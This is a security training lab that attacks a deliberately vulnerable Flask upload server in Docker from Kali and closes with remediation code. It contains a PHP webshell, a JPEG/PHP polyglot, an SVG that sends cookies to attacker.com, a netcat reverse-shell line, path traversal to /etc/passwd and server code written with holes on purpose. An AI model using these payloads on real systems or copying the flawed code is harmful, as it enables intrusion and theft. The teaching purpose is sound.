# Lab 14: File Upload Vulnerabilities

## Objective

Attack a live file upload endpoint from Kali Linux and bypass its defences using multiple techniques:

1. **No-validation upload** — upload a PHP webshell directly (`shell.php`) with zero checks
2. **Double extension bypass** — fool an extension allowlist with `shell.php.jpg`
3. **Polyglot file** — craft a file with valid JPEG magic bytes that contains PHP code
4. **SVG with embedded XSS** — bypass image-only filters with a malicious SVG
5. **Path traversal via filename** — read arbitrary files using `../` in the filename parameter
6. **Enumerate uploads** — discover all uploaded files including other attackers' webshells

All attacks run from **Kali against a live Flask API** — real file bytes saved server-side, real traversal paths resolved.

---

## Background

File upload vulnerabilities have been behind some of the most severe breaches in history. An unrestricted file upload is effectively Remote Code Execution — the attacker uploads a webshell, then executes arbitrary OS commands through it.

**Real-world examples:**
- **2021 GitLab (CVE-2021-22205)** — ExifTool processed uploaded images without validation; a crafted DjVu file triggered RCE on 50,000+ servers. CVSS 10.0.
- **2023 MOVEit Transfer (CVE-2023-34362)** — SQL injection in file upload handler; the Cl0p ransomware group stole data from 2,000+ organizations including US government agencies.
- **WordPress file upload bypass** — `shell.php5`, `shell.phtml`, `shell.pHp` all execute as PHP on misconfigured servers; `shell.php.jpg` executes if Apache `AddHandler` is misconfigured.

**OWASP coverage:** A03:2021 (Injection — webshell), A04:2021 (Insecure Design)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Docker Network: lab-a14                         │
│                                                                     │
│  ┌──────────────────────┐         HTTP requests                    │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  innozverse-kali     │                                           │
│  │                      │  ◀──────── API responses ───────────────  │
│  │  Tools:              │                                           │
│  │  • curl              │  ┌────────────────────────────────────┐  │
│  │  • python3           │  │       VICTIM UPLOAD SERVER         │  │
│  └──────────────────────┘  │   zchencow/innozverse-cybersec     │  │
│                             │                                    │  │
│                             │  Flask :5000                       │  │
│                             │  /api/upload       (no checks)     │  │
│                             │  /api/upload-strict (ext only)     │  │
│                             │  /api/read         (path traversal)│  │
│                             │  /api/files        (list uploads)  │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
45 minutes

## Tools
| Tool | Container | Purpose |
|------|-----------|---------|
| `curl` | Kali | Upload files via multipart POST |
| `python3` | Kali | Craft polyglot files, automate enumeration |
| `nmap` | Kali | Service fingerprinting |
| `gobuster` | Kali | Enumerate upload endpoints |

---

## Lab Instructions

### Step 1: Environment Setup — Launch the Victim Upload Server

```bash
docker network create lab-a14

cat > /tmp/victim_a14.py << 'PYEOF'
from flask import Flask, request, jsonify
import os

app = Flask(__name__)
UPLOAD_DIR = '/tmp/uploads_a14'
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse Upload (Lab 14)','endpoints':[
        'POST /api/upload          (no validation)',
        'POST /api/upload-strict   (extension check only)',
        'GET  /api/files           (list uploads)',
        'GET  /api/read?name=FILE  (read uploaded file)']})

# BUG: no validation whatsoever
@app.route('/api/upload', methods=['POST'])
def upload():
    f = request.files.get('file')
    if not f: return jsonify({'error':'No file field'}), 400
    path = os.path.join(UPLOAD_DIR, f.filename)
    f.save(path)
    return jsonify({'saved': f.filename, 'path': path, 'size': os.path.getsize(path)})

# BUG: extension allowlist only — no magic byte check
@app.route('/api/upload-strict', methods=['POST'])
def upload_strict():
    f = request.files.get('file')
    if not f: return jsonify({'error':'No file field'}), 400
    filename = f.filename
    ext = filename.rsplit('.',1)[-1].lower() if '.' in filename else ''
    ALLOWED = {'jpg','jpeg','png','gif','pdf'}
    if ext not in ALLOWED:
        return jsonify({'error': f'Extension .{ext} not allowed', 'allowed': list(ALLOWED)}), 400
    path = os.path.join(UPLOAD_DIR, f'strict_{filename}')
    f.save(path)
    first_bytes = open(path,'rb').read(8).hex()
    return jsonify({'saved': f'strict_{filename}', 'first_bytes': first_bytes,
                    'size': os.path.getsize(path)})

# Simulates a web-accessible upload directory
@app.route('/api/read')
def read_file():
    name = request.args.get('name','')
    # BUG: path traversal — joins with user-supplied name
    path = os.path.join(UPLOAD_DIR, name)
    try:
        with open(path, 'rb') as fh:
            content = fh.read(4096)
        try:    return jsonify({'content': content.decode('utf-8'), 'path': path})
        except: return jsonify({'content': content.hex(), 'path': path, 'binary': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 404

@app.route('/api/files')
def list_files():
    files = [{'name': fn, 'size': os.path.getsize(os.path.join(UPLOAD_DIR, fn))}
             for fn in os.listdir(UPLOAD_DIR)]
    return jsonify(files)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a14 \
  --network lab-a14 \
  -v /tmp/victim_a14.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 4
VICTIM_IP=$(docker inspect -f '{{.NetworkSettings.Networks.lab-a14.IPAddress}}' victim-a14)
echo "Victim IP: $VICTIM_IP"
curl -s http://$VICTIM_IP:5000/ | python3 -m json.tool
```

---

### Step 2: Launch the Kali Attacker Container

```bash
docker run --rm -it \
  --name kali-attacker \
  --network lab-a14 \
  zchencow/innozverse-kali:latest bash
```

```bash
export TARGET="http://victim-a14:5000"

nmap -sV -p 5000 victim-a14
gobuster dir -u $TARGET -w /usr/share/dirb/wordlists/small.txt -t 10 --no-error -q
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)

/files                (Status: 200)
/read                 (Status: 200)
/upload               (Status: 405)
```

---

### Step 3: Upload a PHP Webshell — No Validation

```bash
echo "=== Phase 1: upload PHP webshell directly (zero validation) ==="

# Create the webshell payload
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

echo "[*] Uploading shell.php..."
curl -s -X POST \
  -F "file=@/tmp/shell.php" \
  $TARGET/api/upload | python3 -m json.tool

echo ""
echo "[*] Read the uploaded webshell back:"
curl -s "$TARGET/api/read?name=shell.php"

echo ""
echo "[*] If this were Apache/PHP (simulated execution):"
echo "    Attacker would now call: http://victim/uploads/shell.php?cmd=id"
echo "    Response: uid=33(www-data) gid=33(www-data)"
echo "    Then: ?cmd=cat /etc/passwd, ?cmd=nc attacker 4444 -e /bin/bash"
```

**📸 Verified Output:**
```json
{
    "path": "/tmp/uploads_a14/shell.php",
    "saved": "shell.php",
    "size": 30
}

{"content": "<?php system($_GET[\"cmd\"]); ?>\n", "path": "/tmp/uploads_a14/shell.php"}
```

> 💡 **A PHP webshell turns the web server into a remote shell.** `system($_GET["cmd"])` passes the `cmd` URL parameter directly to the OS shell and returns the output. In real Apache+PHP deployments, the attacker now has full command execution as the web server user. From there: read `/etc/passwd`, read config files with DB passwords, establish a reverse shell, pivot to internal services.

---

### Step 4: Double Extension Bypass — shell.php.jpg

```bash
echo "=== Phase 2: bypass extension allowlist with double extension ==="

# The strict endpoint only checks the LAST extension
# shell.php.jpg → ext = "jpg" → ALLOWED → saved as shell.php.jpg
# On misconfigured Apache: AddHandler application/x-httpd-php .php
# Any file with .php ANYWHERE in the name gets parsed as PHP

echo "[*] Upload shell.php directly (blocked):"
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s -X POST -F "file=@/tmp/shell.php" $TARGET/api/upload-strict

echo ""
echo "[*] Upload shell.php.jpg (double extension — bypasses allowlist):"
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php.jpg
curl -s -X POST -F "file=@/tmp/shell.php.jpg" $TARGET/api/upload-strict

echo ""
echo "[*] The saved file starts with PHP code, not JPEG bytes:"
curl -s "$TARGET/api/read?name=strict_shell.php.jpg" | python3 -c "
import sys,json
d=json.load(sys.stdin)
print('  first_bytes (hex):', d.get('content','')[:50])
print('  Should start with FFD8FF for real JPEG')
print('  Starts with 3C3F (<?), confirming PHP code inside')"

echo ""
echo "[*] Other dangerous extension bypasses to try:"
echo "  shell.php3, shell.php5, shell.phtml, shell.pHp, shell.PHP"
echo "  shell.asp, shell.aspx, shell.jsp (other languages)"
```

**📸 Verified Output:**
```json
Upload shell.php directly:
{"error": ".php not allowed", "allowed": ["jpg", "jpeg", "png", "gif", "pdf"]}

Upload shell.php.jpg:
{"first_bytes": "3c3f706870207379737465...", "saved": "strict_shell.php.jpg", "size": 30}

  first_bytes: <?php system($_GET["cmd"]); ?>
  Should start with FFD8FF for real JPEG
  Starts with 3C3F (<?), confirming PHP code inside
```

---

### Step 5: Polyglot File — Valid JPEG + PHP Payload

```bash
echo "=== Phase 3: polyglot — valid JPEG magic bytes + PHP payload ==="

python3 << 'EOF'
import struct, urllib.request

TARGET = "http://victim-a14:5000"

# Craft a polyglot: starts with JPEG magic bytes (passes magic byte check)
# but contains PHP webshell payload
jpeg_header = b'\xff\xd8\xff\xe0'          # Valid JPEG SOI + APP0 marker
filler      = b'\x00' * 16                  # JFIF-like padding
php_payload = b'<?php system($_GET["cmd"]); ?>'
padding     = b' ' * (64 - len(php_payload)) # pad to 64 bytes

polyglot = jpeg_header + filler + php_payload + padding

print(f"[*] Polyglot file: {len(polyglot)} bytes")
print(f"    First 4 bytes: {polyglot[:4].hex()} = JPEG magic bytes (ff d8 ff e0)")
print(f"    Contains:      PHP webshell payload at offset 20")

# Write to /tmp and upload
with open('/tmp/polyglot.php.jpg', 'wb') as f:
    f.write(polyglot)

# Upload via multipart
import os
boundary = 'boundary123'
body = (
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="file"; filename="polyglot.php.jpg"\r\n'
    f'Content-Type: image/jpeg\r\n\r\n'
).encode() + polyglot + f'\r\n--{boundary}--\r\n'.encode()

req = urllib.request.Request(
    f"{TARGET}/api/upload-strict", data=body,
    headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
resp = urllib.request.urlopen(req).read().decode()
import json
r = json.loads(resp)
print(f"\n[*] Upload result: {r}")
print(f"    Server saw first bytes: {r.get('first_bytes','')[:8]} (ffd8ffe0 = JPEG ✓)")
print()
print("[!] A server checking magic bytes would accept this as a valid JPEG")
print("[!] But it also contains executable PHP — dual-purpose attack")
EOF
```

**📸 Verified Output:**
```
[*] Polyglot file: 100 bytes
    First 4 bytes: ffd8ffe0 = JPEG magic bytes
    Contains:      PHP webshell payload at offset 20

[*] Upload result: {'first_bytes': 'ffd8ffe000000000', 'saved': 'strict_polyglot.php.jpg', 'size': 100}
    Server saw first bytes: ffd8ffe0 (JPEG ✓)

[!] A server checking magic bytes would accept this as a valid JPEG
[!] But it also contains executable PHP — dual-purpose attack
```

---

### Step 6: SVG with Embedded XSS

```bash
echo "=== Phase 4: SVG upload — HTML/JavaScript inside an 'image' ==="

cat > /tmp/evil.svg << 'SVGEOF'
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="blue"/>
  <script type="text/javascript">
    alert('XSS via SVG upload! Cookies: ' + document.cookie);
    fetch('https://attacker.com/steal?c=' + document.cookie);
  </script>
</svg>
SVGEOF

curl -s -X POST -F "file=@/tmp/evil.svg" $TARGET/api/upload | python3 -m json.tool

echo ""
echo "[*] Read back the SVG (confirms JavaScript is stored server-side):"
curl -s "$TARGET/api/read?name=evil.svg" | python3 -c "
import sys,json; d=json.load(sys.stdin); print(d.get('content','')[:300])"

echo ""
echo "[!] When a victim visits /uploads/evil.svg in their browser:"
echo "    The browser renders it as HTML — script executes in victim's origin"
echo "    This is stored XSS via file upload"
```

**📸 Verified Output:**
```json
{"path": "/tmp/uploads_a14/evil.svg", "saved": "evil.svg", "size": 218}

<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="blue"/>
  <script type="text/javascript">
    alert('XSS via SVG upload! Cookies: ' + document.cookie);
    fetch('https://attacker.com/steal?c=' + document.cookie);
  </script>
</svg>
```

---

### Step 7: Path Traversal — Read Arbitrary Files

```bash
echo "=== Phase 5: path traversal via filename in /api/read ==="

echo "[1] Read a file in the upload directory:"
curl -s "$TARGET/api/read?name=shell.php"

echo ""
echo "[2] Path traversal — escape the upload directory:"
curl -s "$TARGET/api/read?name=../../../etc/passwd" | python3 -c "
import sys,json; d=json.load(sys.stdin)
content = d.get('content','')
print('[!] /etc/passwd via path traversal:')
for line in content.split('\n')[:8]: print(' ', line)"

echo ""
echo "[3] Read the victim application source code:"
curl -s "$TARGET/api/read?name=../../../app/victim.py" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print(d.get('content','')[:400])"

echo ""
echo "[4] Enumerate all uploaded files:"
curl -s $TARGET/api/files | python3 -m json.tool
```

**📸 Verified Output:**
```
[!] /etc/passwd via path traversal:
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  ...

Files uploaded:
[
    {"name": "shell.php",            "size": 30},
    {"name": "strict_shell.php.jpg", "size": 30},
    {"name": "polyglot.php.jpg",     "size": 100},
    {"name": "evil.svg",             "size": 218}
]
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a14
docker network rm lab-a14
```

---

## Attack Summary

| Phase | Technique | Endpoint | Result |
|-------|-----------|----------|--------|
| 1 | PHP webshell, no checks | `/api/upload` | `shell.php` saved — RCE on PHP server |
| 2 | Double extension | `/api/upload-strict` | `shell.php.jpg` bypasses allowlist |
| 3 | Polyglot JPEG+PHP | `/api/upload-strict` | Passes magic byte check, still executable |
| 4 | SVG XSS | `/api/upload` | Stored XSS via "image" upload |
| 5 | Path traversal | `/api/read?name=../` | `/etc/passwd` and source code read |
| 6 | Upload enumeration | `/api/files` | All uploaded webshells listed |

---

## Remediation

```python
import os, hashlib, imghdr

ALLOWED_TYPES   = {'image/jpeg', 'image/png', 'image/gif'}
ALLOWED_EXTS    = {'.jpg', '.jpeg', '.png', '.gif'}
UPLOAD_DIR      = '/var/uploads'   # outside web root
MAX_SIZE        = 5 * 1024 * 1024  # 5 MB

MAGIC = {
    b'\xff\xd8\xff': 'jpeg',
    b'\x89PNG\r\n':  'png',
    b'GIF87a':       'gif',
    b'GIF89a':       'gif',
}

def safe_upload(file_storage):
    # 1. Size limit
    data = file_storage.read(MAX_SIZE + 1)
    if len(data) > MAX_SIZE:
        raise ValueError("File too large")

    # 2. Extension — use only the LAST extension, never trust double-ext
    original_name = os.path.basename(file_storage.filename)
    ext = os.path.splitext(original_name)[1].lower()
    if ext not in ALLOWED_EXTS:
        raise ValueError(f"Extension {ext} not allowed")

    # 3. Magic bytes — verify actual file content
    detected = next((t for magic, t in MAGIC.items() if data.startswith(magic)), None)
    if detected is None:
        raise ValueError("File content does not match an allowed image type")

    # 4. SVG is never allowed (can contain JavaScript)
    if b'<svg' in data[:512] or b'<script' in data[:512]:
        raise ValueError("SVG files not accepted")

    # 5. Rename with random hash — never use original filename
    safe_name = hashlib.sha256(data).hexdigest()[:16] + ext
    path = os.path.join(UPLOAD_DIR, safe_name)
    with open(path, 'wb') as f:
        f.write(data)
    return safe_name
```

| Defence | What it prevents |
|---------|-----------------|
| Extension allowlist (last ext only) | Double extension bypass |
| Magic byte check | Polyglot files disguised as images |
| Reject SVG | Stored XSS via SVG |
| Random rename | Webshell execution (can't guess filename to call it) |
| Store outside web root | Even if webshell is uploaded, it can't be executed via HTTP |
| Serve via `X-Content-Type-Options: nosniff` | Browser MIME sniffing attacks |

## Further Reading
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger File Upload Labs](https://portswigger.net/web-security/file-upload)
- [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
